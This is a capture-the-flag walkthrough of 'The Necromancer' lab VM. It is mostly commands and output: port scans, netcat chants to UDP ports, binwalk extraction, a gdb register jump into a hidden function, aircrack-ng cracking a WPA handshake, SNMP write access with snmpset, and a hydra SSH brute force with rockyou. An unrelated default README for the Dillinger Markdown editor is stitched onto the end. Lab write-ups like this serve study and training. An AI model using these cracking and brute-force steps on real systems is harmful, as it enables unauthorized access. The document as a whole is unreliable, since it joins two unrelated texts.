# The necromancer 1
### Flag 1

```sh
$ sudo arp-scan --interface=vboxnet0 -l
Interface: vboxnet0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.8.1 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
192.168.56.100	08:00:27:07:1f:0b	CADMUS COMPUTER SYSTEMS
192.168.56.101	08:00:27:de:4e:19	CADMUS COMPUTER SYSTEMS
```
Scanning with nmap will give next info:
```sh
 nmap -sU -sT -n -r -T4 -p1-1000 192.168.56.101
 Starting Nmap 7.01 ( https://nmap.org ) at 2017-06-20 19:47 EEST
Nmap scan report for 192.168.56.101
Host is up (0.00051s latency).
Not shown: 1000 filtered ports, 999 open|filtered ports
PORT    STATE SERVICE
666/udp open  doom
MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)

```
VM IP address is 192.168.56.101. Let's see network with wireshark. See, that Necromancer trying to send packet to port 444:
```sh
1	0.000000000	192.168.56.101	192.168.56.1	TCP	78	16687 → 4444 [SYN] Seq=0 Win=16384 Len=0 MSS=1460 SACK_PERM=1 WS=8 TSval=3809785473 TSecr=0
```
Listening from host on port 4444 and decoding from b64 will give first flag:
#### flag1{e6078b9b1aac915d11b9fd59791030bf}

### Flag 2
According to hint  message from previous task ( "Chant the string of flag1 - u666"), trying send flag to 666 port:
```sh
$ nc -u 192.168.56.101 666

You gasp for air! Time is running out!
flag1{e6078b9b1aac915d11b9fd59791030bf}
Chant is too long! You gasp for air!
e6078b9b1aac915d11b9fd59791030bf
Chant had no affect! Try in a different tongue!
```
Maybe we need to get string from flag hash value. Submit hash to crackstation  and get result : opensesame (md5). It works! 
#### flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}

### Flag 3
Crackstation didn't find any solutions for flag2. Reading message from previous task, decide to verify port 80.
There is some web page with text and image. It seems, that there are no any js in source code. So, trying to get some info from picture. Using exiftool has no any success.
strings utility displays interesting things such as: 
><?xpacket begin="
> eathers.txtUT
```sh
$ binwalk -e pileoffeathers.jpg 
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, little-endian offset of first image directory: 8
270           0x10E           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#"> <rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmlns:xmpMM="http
36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
37267         0x9193          End of Zip archive
```
Extracting files with binwalk and obtain third flag:
```sh
/tmp/_pileoffeathers.jpg.extracted$ ls
9082.zip  feathers.txt
yuliia@pickachu:~/tmp/_pileoffeathers.jpg.extracted$ cat feathers.txt | bas
base32    base64    basename  bash      bashbug   
yuliia@pickachu:~/tmp/_pileoffeathers.jpg.extracted$ cat feathers.txt | base64  --decode
flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm
```
#### flag3{9ad3f62db7b91c28b68137000394639f}
### Flag 4
Traditionally with the hint from previous flag, open the link http://192.168.56.101/amagicbridgeappearsatthechasm/
Noting of binwalk, strings, stego utilities were helpfull.
Let's try to make dictionary from web page words and run dirbuster:
```sh
$ tr -cs 'a-zA-Z0-9' '\n' <index.html  >> dict.txt
```
Dirbuster has no effect. Let's merge all text and hints in one dictionary. -> no effect. 
So, googling for magical item will lead to list https://en.wikipedia.org/wiki/List_of_mythological_objects. Making a dictionary from this page and run dirbuster. File talisman was found http://192.168.56.101:80/amagicbridgeappearsatthechasm/talisman
```sh
$ file talisman 
talisman: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2b131df906087adf163f8cba1967b3d2766e639d, not stripped
```
In gdb we see function chantToBreakSpell and no any call to it. This function contains a text, which during runtime unhided, printed and hided. So we need to find a way to call it.
There is some buffer overflow in wearTalisman function: 
```sh
lea     eax, [ebp+var_1C]
push    eax
push    offset format   ; "%s"
call    ___isoc99_scanf
```
But we could just run it with gdb and set eip register to function address:
```sh
(gdb) b chantToBreakSpell
Breakpoint 1 at 0x8048a3b
(gdb) b main
Breakpoint 2 at 0x8048a21
(gdb) r
```
```sh
(gdb) disass main
Dump of assembler code for function main:
   0x08048a13 <+0>:	lea    0x4(%esp),%ecx
   0x08048a17 <+4>:	and    $0xfffffff0,%esp
   0x08048a1a <+7>:	pushl  -0x4(%ecx)
   0x08048a1d <+10>:	push   %ebp
   0x08048a1e <+11>:	mov    %esp,%ebp
   0x08048a20 <+13>:	push   %ecx
=> 0x08048a21 <+14>:	sub    $0x4,%esp
   0x08048a24 <+17>:	call   0x8048529 <wearTalisman>
   0x08048a29 <+22>:	mov    $0x0,%eax
   0x08048a2e <+27>:	add    $0x4,%esp
   0x08048a31 <+30>:	pop    %ecx
   0x08048a32 <+31>:	pop    %ebp
   0x08048a33 <+32>:	lea    -0x4(%ecx),%esp
   0x08048a36 <+35>:	ret    
End of assembler dump.
(gdb) set $eip= 0x8048a3b
(gdb) c
Continuing.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
You fall to your knees.. weak and weary.
Looking up you can see the spell is still protecting the cave entrance.
The talisman is now almost too hot to touch!
Turning it over you see words now etched into the surface:
flag4{ea50536158db50247e110a6c89fcf3d3}
Chant these words at u31337
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```
#### flag4{ea50536158db50247e110a6c89fcf3d3}
### Flag 5
First of all obtain a string from hash -> md5	blackmagic -> send it to port 31337:
```sh
$ nc -u 192.168.56.101 31337
blackmagic
As you chant the words, a hissing sound echoes from the ice walls.
The blue aura disappears from the cave entrance.
You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.
You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.
The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.
Suddenly, you are attacked by a swarm of bats!
You aimlessly thrash at the air in front of you!
The bats continue their relentless attack, until.... silence.
Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.
Looking towards one of the torches, you see something on the cave wall.
You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.
/thenecromancerwillabsorbyoursoul
flag5{0766c36577af58e15545f099a3b15e60}
```
#### flag5{0766c36577af58e15545f099a3b15e60}

### Flag 6
Go to the http://192.168.56.101/thenecromancerwillabsorbyoursoul/ from previous meesage and see  the flag:
#### flag6{b1c3ed8f1db4258e4dcb0ce565f6dc03}

### Flag 7
Download file from necromancer's link and extract files by binwalk:
```sh
$ binwalk necromancer -e
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             bzip2 compressed data, block size = 900k
$ cd _necromancer.extracted/
$ ls -la
total 96
drwxrwxr-x 2 yuliia yuliia  4096 чер 21 12:13 .
drwxrwxr-x 4 yuliia yuliia  4096 чер 21 12:13 ..
-rw-rw-r-- 1 yuliia yuliia 81920 чер 21 12:13 0
yuliia@pickachu:~/tmp/_necromancer.extracted$ file 0 
0: POSIX tar archive (GNU)
yuliia@pickachu:~/tmp/_necromancer.extracted$ binwalk 0
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             POSIX tar archive (GNU), owner user name: "cer.cap"
yuliia@pickachu:~/tmp/_necromancer.extracted$ binwalk 0 -e
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             POSIX tar archive (GNU), owner user name: "cer.cap"
$ cd _0.extracted/
yuliia@pickachu:~/tmp/_necromancer.extracted/_0.extracted$ ls
0.tar  necromancer.cap
```
During analyzing of pcap file, try to get WPA passphase:
```sh
$ aircrack-ng necromancer.cap  -w ~/Downloads/rockyou.txt Opening necromancer.cap
Read 2197 packets.
   #  BSSID              ESSID                     Encryption
   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake)
Choosing first network as target.
Opening necromancer.cap
Reading packets, please wait...
                                 Aircrack-ng 1.2 beta3
                   [00:00:26] 16096 keys tested (553.40 k/s)
                           KEY FOUND! [ death2all ]
      Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC 
                       DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7 
      Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C 
                       56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3 
                       C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92 
                       3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D 
      EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E 
```
Investigating snmp port (161):
```sh
$ snmpwalk -c death2all 192.168.56.101 -v1
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
$ snmpset -c death2allrw -v1 192.168.56.101 iso.3.6.1.2.1.1.6.0 s Unlocked
iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"
$ snmpwalk -c death2all -v1 192.168.56.101
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is unlocked! You may now enter the Necromancer's lair!"
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
End of MIB
```
#### flag7{9e5494108d10bbd5f9e7ae52239546c4}

### Flag 8-10
Get string from flag:demonslayer
Connect via ssh and using demonslayer:demonslayer or empty password fails.
Using hydra obtain password:
```sh
$ hydra -l demonslayer -P ~/Downloads/rockyou.txt 192.168.56.101 ssh
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (http://www.thc.org/thc-hydra) starting at 2017-06-22 13:13:47
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 64 tasks, 14344398 login tries (l:1/p:14344398), ~14008 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.56.101   login: demonslayer   password: 12345678
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-06-22 13:13:51
```
Connecting via ssh with 
```sh
$ nc -u 127.0.0.1  777
/GET
** You only have 3 hitpoints left! **
Defend yourself from the Necromancer's Spells!
Where do the Black Robes practice magic of the Greater Path?  Kelewan
flag8{55a6af2ca3fee9f2fef81d20743bda2c}
** You only have 3 hitpoints left! **
Defend yourself from the Necromancer's Spells!
Who did Johann Faust VIII make a deal with?  Mefistotel
** You only have 2 hitpoints left! **
Defend yourself from the Necromancer's Spells!
Who did Johann Faust VIII make a deal with?  Mephistopheles                 
flag9{713587e17e796209d1df4c9c2c2d2966}
** You only have 2 hitpoints left! **
Defend yourself from the Necromancer's Spells!
Who is tricked into passing the Ninth Gate?  Hedge
flag10{8dc6486d2c63cafcdc6efbba2be98ee4}
A great flash of light knocks you to the ground; momentarily blinding you!
As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.
An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.
The room is silent.
You walk over to where the Necromancer once stood.
On the ground is a small vile.
```
### Flag 11
So, see in home directory file .smallvile
```sh
$ cat .smallvile                                                                                                    
You pick up the small vile.
Inside of it you can see a green liquid.
Opening the vile releases a pleasant odour into the air.
You drink the elixir and feel a great power within your veins!
```
According to previous hint, trying to see, which privileges we have:
```sh
$ sudo -l
Matching Defaults entries for demonslayer on thenecromancer:
    env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"
User demonslayer may run the following commands on thenecromancer:
    (ALL) NOPASSWD: /bin/cat /root/flag11.txt
$ sudo /bin/cat /root/flag11.txt
```
#### flag11{42c35828545b926e79a36493938ab1b1}


Dillinger is a cloud-enabled, mobile-ready, offline-storage, AngularJS powered HTML5 Markdown editor.

  - Type some Markdown on the left
  - See HTML in the right
  - Magic

# New Features!

  - Import a HTML file and watch it magically convert to Markdown
  - Drag and drop images (requires your Dropbox account be linked)


You can also:
  - Import and save files from GitHub, Dropbox, Google Drive and One Drive
  - Drag and drop markdown and HTML files into Dillinger
  - Export documents as Markdown, HTML and PDF

Markdown is a lightweight markup language based on the formatting conventions that people naturally use in email.  As [John Gruber] writes on the [Markdown site][df1]

> The overriding design goal for Markdown's
> formatting syntax is to make it as readable
> as possible. The idea is that a
> Markdown-formatted document should be
> publishable as-is, as plain text, without
> looking like it's been marked up with tags
> or formatting instructions.

This text you see here is *actually* written in Markdown! To get a feel for Markdown's syntax, type some text into the left window and watch the results in the right.

### Tech

Dillinger uses a number of open source projects to work properly:

* [AngularJS] - HTML enhanced for web apps!
* [Ace Editor] - awesome web-based text editor
* [markdown-it] - Markdown parser done right. Fast and easy to extend.
* [Twitter Bootstrap] - great UI boilerplate for modern web apps
* [node.js] - evented I/O for the backend
* [Express] - fast node.js network app framework [@tjholowaychuk]
* [Gulp] - the streaming build system
* [Breakdance](http://breakdance.io) - HTML to Markdown converter
* [jQuery] - duh

And of course Dillinger itself is open source with a [public repository][dill]
 on GitHub.

### Installation

Dillinger requires [Node.js](https://nodejs.org/) v4+ to run.

Install the dependencies and devDependencies and start the server.

```sh
$ cd dillinger
$ npm install -d
$ node app
```

For production environments...

```sh
$ npm install --production
$ npm run predeploy
$ NODE_ENV=production node app
```

### Plugins

Dillinger is currently extended with the following plugins. Instructions on how to use them in your own application are linked below.

| Plugin | README |
| ------ | ------ |
| Dropbox | [plugins/dropbox/README.md] [PlDb] |
| Github | [plugins/github/README.md] [PlGh] |
| Google Drive | [plugins/googledrive/README.md] [PlGd] |
| OneDrive | [plugins/onedrive/README.md] [PlOd] |
| Medium | [plugins/medium/README.md] [PlMe] |
| Google Analytics | [plugins/googleanalytics/README.md] [PlGa] |


### Development

Want to contribute? Great!

Dillinger uses Gulp + Webpack for fast developing.
Make a change in your file and instantanously see your updates!

Open your favorite Terminal and run these commands.

First Tab:
```sh
$ node app
```

Second Tab:
```sh
$ gulp watch
```

(optional) Third:
```sh
$ karma test
```
#### Building for source
For production release:
```sh
$ gulp build --prod
```
Generating pre-built zip archives for distribution:
```sh
$ gulp build dist --prod
```
### Docker
Dillinger is very easy to install and deploy in a Docker container.

By default, the Docker will expose port 80, so change this within the Dockerfile if necessary. When ready, simply use the Dockerfile to build the image.

```sh
cd dillinger
docker build -t joemccann/dillinger:${package.json.version}
```
This will create the dillinger image and pull in the necessary dependencies. Be sure to swap out `${package.json.version}` with the actual version of Dillinger.

Once done, run the Docker image and map the port to whatever you wish on your host. In this example, we simply map port 8000 of the host to port 80 of the Docker (or whatever port was exposed in the Dockerfile):

```sh
docker run -d -p 8000:8080 --restart="always" <youruser>/dillinger:${package.json.version}
```

Verify the deployment by navigating to your server address in your preferred browser.

```sh
127.0.0.1:8000
```

#### Kubernetes + Google Cloud

See [KUBERNETES.md](https://github.com/joemccann/dillinger/blob/master/KUBERNETES.md)


### Todos

 - Write MOAR Tests
 - Add Night Mode

License
----

MIT


**Free Software, Hell Yeah!**

[//]: # (These are reference links used in the body of this note and get stripped out when the markdown processor does its job. There is no need to format nicely because it shouldn't be seen. Thanks SO - http://stackoverflow.com/questions/4823468/store-comments-in-markdown-syntax)


   [dill]: <https://github.com/joemccann/dillinger>
   [git-repo-url]: <https://github.com/joemccann/dillinger.git>
   [john gruber]: <http://daringfireball.net>
   [df1]: <http://daringfireball.net/projects/markdown/>
   [markdown-it]: <https://github.com/markdown-it/markdown-it>
   [Ace Editor]: <http://ace.ajax.org>
   [node.js]: <http://nodejs.org>
   [Twitter Bootstrap]: <http://twitter.github.com/bootstrap/>
   [jQuery]: <http://jquery.com>
   [@tjholowaychuk]: <http://twitter.com/tjholowaychuk>
   [express]: <http://expressjs.com>
   [AngularJS]: <http://angularjs.org>
   [Gulp]: <http://gulpjs.com>

   [PlDb]: <https://github.com/joemccann/dillinger/tree/master/plugins/dropbox/README.md>
   [PlGh]: <https://github.com/joemccann/dillinger/tree/master/plugins/github/README.md>
   [PlGd]: <https://github.com/joemccann/dillinger/tree/master/plugins/googledrive/README.md>
   [PlOd]: <https://github.com/joemccann/dillinger/tree/master/plugins/onedrive/README.md>
   [PlMe]: <https://github.com/joemccann/dillinger/tree/master/plugins/medium/README.md>
   [PlGa]: <https://github.com/RahulHP/dillinger/blob/master/plugins/googleanalytics/README.md>
